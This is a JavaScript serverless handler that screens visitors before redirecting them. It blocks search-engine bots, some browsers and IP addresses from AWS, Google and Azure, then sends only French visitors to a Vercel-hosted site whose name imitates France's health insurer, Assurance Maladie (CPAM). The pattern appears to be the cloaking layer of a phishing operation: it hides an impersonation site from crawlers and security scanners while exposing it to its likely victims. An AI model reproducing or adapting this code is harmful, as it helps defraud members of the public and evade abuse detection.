import fetch from 'node-fetch';
import checkIp from 'ip-range-check';

export default async function handler(req, res) {
  // Get client IP from headers (Vercel uses x-forwarded-for)
  const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;

  // Block bots based on user-agent
  const userAgent = req.headers['user-agent'] || '';
  const botSignatures = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot'];
  if (botSignatures.some(bot => userAgent.toLowerCase().includes(bot.toLowerCase()))) {
    res.status(403).send('Access blocked for bots.');
    return;
  }

  // Block Safe Browser (example, assuming Safe Exam Browser or similar)
  const blockedBrowsers = ['SafeExamBrowser', 'TorBrowser'];
  if (blockedBrowsers.some(browser => userAgent.toLowerCase().includes(browser.toLowerCase()))) {
    res.status(403).send('Access blocked for this browser.');
    return;
  }

  try {
    // Fetch AWS IP ranges
    const awsResponse = await fetch('https://ip-ranges.amazonaws.com/ip-ranges.json');
    const awsData = await awsResponse.json();
    const awsRanges = awsData.prefixes.map(prefix => prefix.ip_prefix);

    // Placeholder Google and Azure ranges (replace with dynamic fetching for production)
    const googleRanges = ['35.190.0.0/16', '104.196.0.0/14']; // Fetch from ipinfo.io or DNS
    const azureRanges = ['20.36.0.0/14', '40.90.0.0/15']; // Fetch from Microsoft
    const blockedRanges = [...awsRanges, ...googleRanges, ...azureRanges];

    // Check if IP is from a blocked cloud provider
    if (blockedRanges.some(range => checkIp(clientIp, range))) {
      res.status(403).send('Access blocked for cloud provider IPs.');
      return;
    }

    // Check if IP is from France using ip-api.com
    const geoResponse = await fetch(`http://ip-api.com/json/${clientIp}`);
    const geoData = await geoResponse.json();

    if (geoData.status === 'success' && geoData.countryCode === 'FR') {
      res.redirect(301, 'https://assurance-maladie-cpam.vercel.app/');
    } else {
      res.status(403).send('Access restricted to France-based IPs only.');
    }
  } catch (error) {
    console.error('Error in IP validation:', error);
    res.status(500).send('Internal server error.');
  }
}